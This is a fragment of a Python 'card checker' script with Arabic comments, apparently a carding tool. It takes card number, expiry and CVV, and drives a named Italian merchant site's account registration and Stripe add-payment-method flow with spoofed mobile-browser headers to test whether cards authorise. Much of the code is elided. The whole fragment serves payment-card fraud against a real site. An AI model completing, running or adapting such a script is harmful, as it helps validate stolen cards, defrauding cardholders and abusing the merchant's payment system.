...
def Stripe1(ccx):
    """
    فحص بطاقة على rubinospiriti.it (Stripe - Auth - Register with email only)
    ccx: رقم|شهر|سنة|cvv
    """
    try:
        ccx = ccx.strip()
        ...
        r = requests.Session()
        site_url = "https://rubinospiriti.it"
        ...
        ##print("\n[1/5] فتح صفحة الحساب...")
        headers = {
            'authority': 'rubinospiriti.it',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': f'{site_url}/account/',
        ...
        response = r.get(f'{site_url}/account/', headers=headers)
        ...
        r.post(f'{site_url}/account/', headers=headers, data=data)
        #print("    ✅ تم التسجيل")
        
        # ===== 3. فتح صفحة إضافة البطاقة =====
        #print("\n[3/5] فتح صفحة إضافة البطاقة...")
        headers = {
            'authority': 'rubinospiriti.it',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': f'{site_url}/account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
        ...
        response = r.get(f'{site_url}/account/add-payment-method/', headers=headers)
        html = response.text
        #print(f"    ✅ HTTP {response.status_code}")
        ...
        # استخراج stripe_account (ليس موجوداً)
        stripe_account = ""
        #print(f"    ⚠️ No stripe_account found")
        
        # ===== 4. جلب معرفات Stripe =====
        #print("\n[4/5] جلب معرفات Stripe...")
        headers = {
        ...
        headers_final = {
            ...
            'origin': site_url,
            'referer': f'{site_url}/account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
